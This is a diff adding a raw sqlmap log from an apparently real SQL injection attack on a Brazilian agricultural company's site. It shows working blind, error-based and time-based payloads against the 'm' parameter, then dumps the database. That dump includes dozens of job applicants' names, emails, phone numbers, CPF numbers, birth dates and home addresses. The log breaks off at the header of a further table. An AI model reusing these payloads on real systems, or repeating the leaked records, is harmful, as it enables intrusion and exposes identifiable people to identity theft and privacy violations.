@@ -1,0 +1,580 @@
+sqlmap identified the following injection point(s) with a total of 282 HTTP(s) requests:
+---
+Parameter: m (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: m=29 AND 3009=3009
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: m=29 AND (SELECT 4753 FROM(SELECT COUNT(*),CONCAT(0x716b717a71,(SELECT (ELT(4753=4753,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: m=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] agrofort_bd
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: m (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: m=29 AND 3009=3009
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: m=29 AND (SELECT 4753 FROM(SELECT COUNT(*),CONCAT(0x716b717a71,(SELECT (ELT(4753=4753,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: m=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+Database: agrofort_bd
+[36 tables]
++----------------------+
+| cadastros            |
+| categorias           |
+| compras_produtos     |
+| config_atendimento   |
+| config_cadastros     |
+| config_categorias    |
+| config_clientes      |
+| config_dicas         |
+| config_email         |
+| config_equipamentos  |
+| config_especialidade |
+| config_eventos       |
+| config_infraestrut   |
+| config_mala          |
+| config_marcas        |
+| config_noticias      |
+| config_paisagismo    |
+| config_portifolio    |
+| config_produtos      |
+| config_usuarios      |
+| cur_cur              |
+| cur_exp              |
+| curriculos           |
+| dicas                |
+| emails               |
+| especialidade        |
+| eventos              |
+| eventos_fotos        |
+| marcas               |
+| modulos              |
+| novidades            |
+| paisagismo           |
+| produtos             |
+| produtos_fotos       |
+| produtos_informacoes |
+| usuarios             |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: m (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: m=29 AND 3009=3009
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: m=29 AND (SELECT 4753 FROM(SELECT COUNT(*),CONCAT(0x716b717a71,(SELECT (ELT(4753=4753,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: m=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: agrofort_bd
+[36 tables]
++----------------------+
+| cadastros            |
+| categorias           |
+| compras_produtos     |
+| config_atendimento   |
+| config_cadastros     |
+| config_categorias    |
+| config_clientes      |
+| config_dicas         |
+| config_email         |
+| config_equipamentos  |
+| config_especialidade |
+| config_eventos       |
+| config_infraestrut   |
+| config_mala          |
+| config_marcas        |
+| config_noticias      |
+| config_paisagismo    |
+| config_portifolio    |
+| config_produtos      |
+| config_usuarios      |
+| cur_cur              |
+| cur_exp              |
+| curriculos           |
+| dicas                |
+| emails               |
+| especialidade        |
+| eventos              |
+| eventos_fotos        |
+| marcas               |
+| modulos              |
+| novidades            |
+| paisagismo           |
+| produtos             |
+| produtos_fotos       |
+| produtos_informacoes |
+| usuarios             |
++----------------------+
+
+Database: agrofort_bd
+Table: cadastros
+[2 entries]
++--------+------------+---------------------------------+------------------+----------------+-------------------+
+| cad_id | cad_rg     | cad_nome                        | cad_cpf_cnpj     | cad_nascimento | cad_nome_fantasia |
++--------+------------+---------------------------------+------------------+----------------+-------------------+
+| 4      | <blank>    | Dias & Dias Representações Ltda | 12345674/8945-66 | <blank>        | Representar       |
+| 5      | 1386178721 | Deivid Souza Dias               | 092.180.496-23   | 11/07/1989     | <blank>           |
++--------+------------+---------------------------------+------------------+----------------+-------------------+
+
+Database: agrofort_bd
+Table: categorias
+[3 entries]
++--------+-------------+--------------+----------+----------+-----------+-----------+
+| cat_id | cat_idnivel | cat_nome     | cat_foto | cat_desc | cat_nivel | cat_ordem |
++--------+-------------+--------------+----------+----------+-----------+-----------+
+| 94     | 0           | Bomba d agua | <blank>  | <blank>  | 2         | 0         |
+| 98     | 0           | Motobomba    | <blank>  | <blank>  | 2         | 0         |
+| 99     | 0           | <blank>      | <blank>  | <blank>  | 3         | 0         |
++--------+-------------+--------------+----------+----------+-----------+-----------+
+
+Database: agrofort_bd
+Table: compras_produtos
+[2 entries]
++----+--------+--------+---------+
+| id | pro_id | com_id | pro_qtd |
++----+--------+--------+---------+
+| 8  | 2      | 1      | 2       |
+| 12 | 32     | 11     | 0       |
++----+--------+--------+---------+
+
+Database: agrofort_bd
+Table: config_atendimento
+[1 entry]
++-------------+-----------------+
+| conf_nome   | conf_link       |
++-------------+-----------------+
+| Atendimento | fotos_eve&eve=1 |
++-------------+-----------------+
+
+Database: agrofort_bd
+Table: config_cadastros
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Portfolio | novidades |
++-----------+-----------+
+
+Database: agrofort_bd
+Table: config_categorias
+[2 entries]
++--------------+------------+------------+------------+------------+------------------+--------------------+
+| conf_nome    | conf_link  | conf_mdesc | conf_nivel | conf_mfoto | conf_nome_plural | conf_nome_singular |
++--------------+------------+------------+------------+------------+------------------+--------------------+
+| Produtos     | categorias | 1          | 2          | 1          | categorias       | categoria          |
+| Subcategoria | categorias | 2          | 2          | 2          | subcategorias    | subcategoria       |
++--------------+------------+------------+------------+------------+------------------+--------------------+
+
+Database: agrofort_bd
+Table: config_clientes
+[1 entry]
++-----------+-----------------+
+| conf_nome | conf_link       |
++-----------+-----------------+
+| Parceiros | fotos_eve&eve=2 |
++-----------+-----------------+
+
+Database: agrofort_bd
+Table: config_dicas
+[1 entry]
++-----------+-------------+
+| conf_nome | conf_link   |
++-----------+-------------+
+| Dicas     | dicas&cat=0 |
++-----------+-------------+
+
+Database: agrofort_bd
+Table: config_email
+[1 entry]
++------------+-----------+
+| conf_nome  | conf_link |
++------------+-----------+
+| Newsletter | mala      |
++------------+-----------+
+
+Database: agrofort_bd
+Table: config_equipamentos
+[1 entry]
++-----------+------------+
+| conf_nome | conf_link  |
++-----------+------------+
+| Curriculo | curriculos |
++-----------+------------+
+
+Database: agrofort_bd
+Table: config_especialidade
+[0 entries]
++-----------+-------------+
+| conf_link | config_nome |
++-----------+-------------+
++-----------+-------------+
+
+Database: agrofort_bd
+Table: config_eventos
+[1 entry]
++-----------+------------------------+
+| conf_nome | conf_link              |
++-----------+------------------------+
+| Galeria   | fotos_eve&eve=20&cat=1 |
++-----------+------------------------+
+
+Database: agrofort_bd
+Table: config_infraestrut
+[1 entry]
++------------+------------+
+| conf_nome  | conf_link  |
++------------+------------+
+| Curriculos | curriculos |
++------------+------------+
+
+Database: agrofort_bd
+Table: config_mala
+[1 entry]
++-----------+--------------------+
+| conf_nome | conf_link          |
++-----------+--------------------+
+| Destaque  | categorias&nivel=3 |
++-----------+--------------------+
+
+Database: agrofort_bd
+Table: config_marcas
+[1 entry]
++--------------+-----------+
+| conf_nome    | conf_link |
++--------------+-----------+
+| Fornecedores | marcas    |
++--------------+-----------+
+
+Database: agrofort_bd
+Table: config_noticias
+[1 entry]
++-----------+-------------+
+| conf_nome | conf_link   |
++-----------+-------------+
+| Novidades | dicas&cat=1 |
++-----------+-------------+
+
+Database: agrofort_bd
+Table: config_paisagismo
+[1 entry]
++----------+-----------+-----------+------------+------------+------------+
+| conf_img | conf_desc | conf_info | conf_nome  | conf_link  | conf_fotos |
++----------+-----------+-----------+------------+------------+------------+
+| 2        | 2         | 2         | Paisagismo | paisagismo | 2          |
++----------+-----------+-----------+------------+------------+------------+
+
+Database: agrofort_bd
+Table: config_portifolio
+[1 entry]
++-----------+---------------+
+| conf_nome | conf_link     |
++-----------+---------------+
+| Eventos   | eventos&cat=2 |
++-----------+---------------+
+
+Database: agrofort_bd
+Table: config_produtos
+[1 entry]
++----------+-----------+-----------+-------------+------------------+------------+
+| conf_img | conf_desc | conf_info | conf_nome   | conf_link        | conf_fotos |
++----------+-----------+-----------+-------------+------------------+------------+
+| 2        | 2         | 2         | Lancamentos | produtos&catid=5 | 2          |
++----------+-----------+-----------+-------------+------------------+------------+
+
+Database: agrofort_bd
+Table: config_usuarios
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Usuarios  | usuarios  |
++-----------+-----------+
+
+Database: agrofort_bd
+Table: cur_cur
+[2 entries]
++--------+---------+---------+-----------------+-------------+------------------------+
+| cus_id | cus_ent | cus_cur | cus_car         | cus_per     | cus_nome               |
++--------+---------+---------+-----------------+-------------+------------------------+
+| 14     | <blank> | 14      | <blank>         | <blank>     | <blank>                |
+| 16     | IFPA    | 15      | 1140 horas/aula | 2013 - 2014 | Técnico em Informática |
++--------+---------+---------+-----------------+-------------+------------------------+
+
+Database: agrofort_bd
+Table: cur_exp
+[10 entries]
++--------+---------+----------------+----------------+-----------------------------+---------------------------+
+| exp_id | exp_cur | exp_per        | exp_car        | exp_emp                     | exp_fun                   |
++--------+---------+----------------+----------------+-----------------------------+---------------------------+
+| 2      | 6       | periodo curso2 | asdf cargo     | exp                         | funcao                    |
+| 3      | 8       | per            | carg           | em                          | fun                       |
+| 4      | 9       | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 5      | 10      | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 6      | 11      | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 7      | 11      | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 8      | 11      | asdasd         | <blank>        | <blank>                     | <blank>                   |
+| 9      | 13      | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 10     | 14      | <blank>        | <blank>        | <blank>                     | <blank>                   |
+| 11     | 15      | 2008           | Administrativo | Intertechne Consultores S.A | Assistente Administrativo |
++--------+---------+----------------+----------------+-----------------------------+---------------------------+
+
+Database: agrofort_bd
+Table: curriculos
+[37 entries]
++--------+-----------------------------------------------------+---------+--------------------------------------+------------+---------------+---------------------+---------+---------------+---------+----------------+------------+---------------------------------------------------------------------------------+---------+---------------------+--------------------------+------------------------+---------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| cur_id | cur_ent                                             | cur_cad | cur_ema                              | cur_cnh    | cur_tel       | cur_dat             | cur_sta | cur_cel       | cur_cat | cur_cpf        | cur_nas    | cur_end                                                                         | cur_msg | cur_esc             | cur_cur                  | cur_per                | cur_nome                                    | cur_qualificacoes                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
++--------+-----------------------------------------------------+---------+--------------------------------------+------------+---------------+---------------------+---------+---------------+---------+----------------+------------+---------------------------------------------------------------------------------+---------+---------------------+--------------------------+------------------------+---------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 13     | Universidade Estadual do Oeste do Paraná            | 0       | danih_mohr@hotmail.com               | B          | (45)3035-1467 | 2015-01-08 17:34:45 | 1       | (45)9924-0277 | <blank> | 072.422.979-58 | 12/05/1990 | Rua Recife                                                                      | <blank> | Superior Completo   | Engenharia Agrícola      | <blank>                | Daniele Mohr                                | Carreira                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| 14     | <blank>                                             | 0       | suzanaligosk@hotmail.com             | <blank>    | (93)9976-8734 | 2015-02-23 13:24:56 | 2       | (93)9976-8734 | <blank> | 538.608.102-00 | 08/12/1995 | bairro: buritis                                                                 | <blank> | Ensino Médio        | Técnico em Agropecuária  | <blank>                | Suzana Ligoski Zeferino                     | Não                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| 15     | IFPA                                                | 0       | welissonjc@hotmail.com               | AB         | (93)9997-5565 | 2015-07-30 10:31:17 | 1       | (93)9205-5615 | <blank> | 015.510.662-70 | 10/03/1992 | Alameda Polivalente nº 2693, Jardim Uirapuru                                    | <blank> | Ensino Médio        | <blank>                  | 2008 - 2010            | Welisson de Jesus Carvalho                  | Conhecimento em Informática (Pacote Office, Internet,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| 16     | FIT/UNAMA                                           | 0       | glaucioalencar86@hotmail.com         | A/B        | (93)3515-4922 | 2015-12-02 19:37:51 | 1       | (93)9102-6560 | <blank> | 786.181.262-68 | 10/09/1992 | Rua Maria das Graças, 23 - Aberto Soares, Altamira-PA                           | <blank> | Superior Incompleto | Medicina Veterinária     | 5° semestre            | Glaucio Correa Alencar Filho                | Curso Tec. em Agropecuária - IFPA (2012)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| 17     | <blank>                                             | 0       | paloma-karoline13@hotmail.com        | <blank>    | (91)3015-6277 | 2016-01-15 18:49:44 | 1       | (93)9109-2320 | <blank> | 003.615.132-75 | 24/06/1993 | Modesto Silva , Independente 1 nº 1074                                          | <blank> | Ensino Médio        | <blank>                  | <blank>                | paloma karoline da costa ferreira           | .                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| 18     | UNIG                                                | 0       | fabricioriva@hotmail.com             | AB         | (28)3553-1409 | 2016-02-19 13:20:26 | 1       | (28)9983-1745 | <blank> | 133.028.737-19 | 06/12/1989 | Rodovia BR 482 km 95 n 3403, Guaçuí ES                                          | <blank> | Superior Completo   | Medicina Veterinária     | 2011 a 2016            | Fabrício Xavier Pereira                     | Curso                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| 19     | Iff Júlio de Castilhos                              | 0       | Rafael-barbieri1@hotmail.com         | AB         | (55)9618-0905 | 2016-03-06 19:09:55 | 1       | (55)9651-8569 | <blank> | 039.742.840-52 | 24/10/1996 | Avenida Assis Brasil /Júlio de Castilhos RS                                     | <blank> | Superior Completo   | <blank>                  | <blank>                | Rafael Barbieri belle                       | Não tenho                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| 20     | POLIVALENTE DE ALTAMIRA                             | 0       | edileia.belly@hotmail.com            | AB         | (93)9152-4772 | 2016-04-08 00:10:37 | 1       | (93)9152-4772 | <blank> | 885.793.012-20 | 03/11/1985 | RUA 06, 372,  SÃO JOAQUIM                                                       | <blank> | Ensino Médio        | <blank>                  | <blank>                | EDILEIA PEREIRA DA SILVA                    | PONTUALIDADE,  RESPONSÁVEL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| 21     | d8DySkRS8O                                          | 0       | iqCV7fwnSw6g                         | pc5mBYgTVH | gbwt4dfS3KHJ  | 2016-05-24 08:04:11 | 1       | JKcSDtQ5GTN   | <blank> | N8q8o1jo6w     | f77uCtBG5  | 65f76ECMn2uZ                                                                    | <blank> | Superior Incompleto | htmPzyB8y                | ptvarC5E               | Maverick                                    | I know I want to build my own computer for college. But the only brand that I know of that does build computers to your sptafiicceion is Dell. However, I’m                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| 22     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2016-05-24 08:04:12 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 23     | Faculdade                                           | 0       | andressa.a.r.melo@gmail.com          | A/B        | (15)9961-2809 | 2016-08-02 15:08:39 | 1       | <blank>       | <blank> | 440.053.848-62 | 24/11/1995 | Rua Antônio Alves, Itapeva/SP                                                   | <blank> | Superior Incompleto | Agronomia                | 8                      | Andressa Aparecida Rodrigues de Melo        | - Curso: Manejo do Solo no Sistema de Plantio Direto (SPD)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| 24     | FACULDADE ANHANGUERA DE ANÁPOLIS                    | 0       | weiderjunior26@hotmail.com           | AB         | (62)8295-7319 | 2016-08-02 18:33:38 | 1       | <blank>       | <blank> | 041.097.771-35 | 26/04/1993 | RUA RA 02 QD 11 LT 08 Anápolis goias                                            | <blank> | Superior Completo   | ENGENHARIA MECÂNICA      | 5 ANOS                 | WEIDER ALVES DE FARIA JUNIOR                | NR 12 BÁSICO , NR 18 BÁSICO                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| 25     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2016-08-07 17:57:06 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 26     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2016-08-17 10:06:57 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 27     | Lincom                                              | 0       | kellyflorencio@outlook.com.br        | <blank>    | (65)3691-1364 | 2016-08-25 00:51:42 | 1       | (65)9664-1705 | <blank> | <blank>        | 13/12/1988 | 11 Quadra 68 1414 Casa 4                                                        | <blank> | Ensino Médio        | <blank>                  | 2007                   | kelly florencio de sousa                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| 28     | FACULDADE SAO LUCAS EM PORTO VELHO -RO              | 0       | araujo_pvh@hotmail.com               | a/b        | (93)3222-2222 | 2016-10-19 10:22:31 | 1       | (93)8802-5874 | <blank> | 990.265.462-20 | 12/10/1989 | AV ALACID NUNES 3326 BAIRRO UIRAPURU-PA                                         | <blank> | Superior Completo   | ADMINISTRAÇÃO            | JAN/2008 A DEZ/2012    | KEYLA ARAUJO DA SILVA                       | GRADUADA EM ADM                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| 29     | UFPB                                                | 0       | nubia274@gmail.com                   | B          | (81)3728-2972 | 2016-11-09 12:52:02 | 1       | (81)9721-5077 | <blank> | 048.591.494-83 | 26/01/1984 | Av.                                                                             | <blank> | Doutorado           | Zootecnia                | 2014                   | Núbia Michelle Vieira da Silva              | 2016                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| 30     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2016-11-09 12:52:10 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 31     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2016-11-09 12:52:11 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 32     | ducilla Almeida do Nascimento                       | 0       | lydia-natividade@live.com            | <blank>    | (93)9918-8891 | 2016-11-17 13:56:43 | 1       | (93)9916-8874 | <blank> | 548.574.812-00 | 25/11/1997 | rua agua azul bairro mutirao 2818 frente a igreja quadrangular, Altamira, Pará  | <blank> | Ensino Médio        | <blank>                  | <blank>                | Lidia Maria Farias Natividade               | Nivel técnico                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| 33     | <blank>                                             | 0       | marcusfuruya@hotmail.com             | B          | (93)9179-9042 | 2016-11-21 15:58:22 | 1       | (93)9179-9042 | <blank> | 026.340.682-20 | 20/12/1996 | Rua A6, Quadra 31, L 33, Cidade Jardim- Buriti,  Liberdade.    Altamira/Pa      | <blank> | Ensino Médio        | <blank>                  | <blank>                | Marcus Paulo de Castro Furuya               | Estive                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| 34     | Universidade da Amazônia                            | 0       | raiza.maia@hotmail.com               | B          | (91)8708-9006 | 2016-11-21 16:11:13 | 1       | (93)9179-9042 | <blank> | 012.798.092-05 | 27/12/1991 | Rua A6, Quadra 31, L 33, Cidade Jardim- Buriti, Liberdade.     Altamira/Pa      | <blank> | Superior Completo   | Enfermagem               | 2010 - 2016            | Raiza Maia Gonçalves Furuya                 | Sou eficiente, buscando sempre melhorias tanto para mim quanto para a organização.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
+| 35     | ceja                                                | 0       | jheicyoliveira@gmail.com             | <blank>    | (93)3515-6593 | 2017-01-13 23:08:18 | 1       | (93)9215-8226 | <blank> | 018.082.912-20 | 15/07/1993 | avenida alacidi nunes ,altamira pará                                            | <blank> | Ensino Médio        | adistancia               | 1 ano e 8 meses        | jheicylene dos santos piedade               | •                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| 36     | ceja                                                | 0       | jheicyoliveira@gmail.com             | <blank>    | (93)3515-6593 | 2017-01-13 23:11:08 | 1       | (93)9215-8226 | <blank> | 018.082.912-20 | 15/07/1993 | avenida alacidi nunes ,altamira pará                                            | <blank> | Ensino Médio        | adistancia               | 1 ano e 8 meses        | jheicylene dos santos piedade               | •                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| 37     | E.E.E.M. PROF. DUCILLA ALMEIDA DO NASCIMENTO        | 0       | wandersonribeiroflash@hotmail.com.br | A-B        | (93)9180-6275 | 2017-02-13 18:30:31 | 1       | (93)9915-4514 | <blank> | 020.968.572-79 | 23/08/1993 | Travessa                                                                        | <blank> | Ensino Médio        | <blank>                  | 2012                   | Wanderson Gonçalves Ribeiro                 | Sou                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| 38     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-02-16 13:00:49 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 39     | UNIVERSIDADE FEDERAL DO PARÁ                        | 0       | JAYLLSON.RAPOSO22@GMAIL.COM          | <blank>    | (93)3515-2529 | 2017-04-18 14:42:52 | 1       | (93)9116-2617 | <blank> | 017.321.332-47 | 26/01/1994 | RUA JOÃO BATISTA, 3063 - ALTAMIRA-PA                                            | <blank> | Superior Incompleto | ENGENHARIA AGRONÔMICA    | 3º                     | JAILSON PANTALEÃO RAPOSO                    | BACHARELADO EM ENGENHARIA AGRONÔMICA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| 40     | FICAT                                               | 0       | vitorio_oliva@hotmail.com            | AB         | (91)8158-2461 | 2017-06-06 18:38:48 | 1       | (91)8158-2461 | <blank> | 999.655.002-82 | 12/12/1987 | tv.Pedro Gomes,bairro Catedral,n 179 Altamira Pa.                               | <blank> | Superior Completo   | DIREITO                  | terminio do curso 2016 | Vitorio Alves Oliva Filho                   | Sou Baicharel em DIREITO, Com cursos complementares,como dois anos de Administracao de Empresa, cursado na UNAMA,UNIVERSIDADE DA AMAZONIA, curso de INGLES,basico. Escola de INGLES ASLAN,Curso de computacao pela escola MICROLINS, Experiencia em vendas externas,para empresas e para comprador final,gerenciamento e supervisao de pessoas,estoque,venda e pos venda,facilidade de atendimento,boa comunicao e tratamento ao cliente, devido experiencia,como assessor parlemntar e juridico na ASSEMBLEIA LESGILATIVA DO PARA, estando locado no gabinete do Deputado, Soldado TERCIO. |
+| 41     | unip                                                | 0       | jaquelinykeslian@gmail.com           | <blank>    | (93)9918-1552 | 2017-06-14 10:53:48 | 1       | (93)9135-4446 | <blank> | 010.282.312-02 | 20/07/1991 | avenida D 22 bairro buriti  Altamira PA                                         | <blank> | Superior Incompleto | gestão de rh             | 05/01/2017             | jaqueliny keslian neres dos santos          | Tecnico em radiologia concluido \r\nGestao de recursos humanos em andamento                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| 42     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-06-19 01:31:57 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 43     | Universidade Paulista Unip - Campus Ribeirão Preto  | 0       | nataliafrancocamargo@gmail.com       | A/B        | (16)9421-6264 | 2017-06-23 23:54:54 | 1       | (16)9942-1626 | <blank> | 472.981.028-77 | 23/08/1997 | Rua Egydio Favaretto, 866                                                       | <blank> | Superior Incompleto | Engenharia Civil         | Noturno                | Natália Drieli Agostinho Franco de Camargo  | Pacote office avançado.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 44     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-07-11 00:33:26 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 45     | UNINTER                                             | 0       | hdguilimer@gmail.com                 | <blank>    | (93)9144-0623 | 2017-07-14 15:42:49 | 1       | (93)9914-4062 | <blank> | 017.303.272-90 | 04/01/1995 | Rua da Paz, bairro boa esperança, Altamira PA                                   | <blank> | Superior Incompleto | Engenheira de Produção   | 1                      | Huderson Guilherme Monteiro da Silva        | Responsável, conhecimento  informatica, conhecimentos                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| 46     | UNINTER                                             | 0       | hdguilimer@gmail.com                 | <blank>    | (93)9144-0623 | 2017-07-14 15:43:08 | 1       | (93)9914-4062 | <blank> | 017.303.272-90 | 04/01/1995 | Rua da Paz, bairro boa esperança, Altamira PA                                   | <blank> | Superior Incompleto | Engenheira de Produção   | 1                      | Huderson Guilherme Monteiro da Silva        | Responsável, conhecimento  informatica, conhecimentos                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| 47     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-07-27 20:03:19 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 48     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-08-11 09:33:39 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 49     | <blank>                                             | 0       | <blank>                              | <blank>    | <blank>       | 2017-08-25 13:51:40 | 1       | <blank>       | <blank> | <blank>        | <blank>    | <blank>                                                                         | <blank> | <blank>             | <blank>                  | <blank>                | <blank>                                     | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
++--------+-----------------------------------------------------+---------+--------------------------------------+------------+---------------+---------------------+---------+---------------+---------+----------------+------------+---------------------------------------------------------------------------------+---------+---------------------+--------------------------+------------------------+---------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: agrofort_bd
+Table: dicas
+[4 entries]
++--------+------------+--------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------+
+| dic_id | dic_data   | dic_foto     | dic_texto                                                                                      | dic_titulo                                                                                     |
++--------+------------+--------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------+
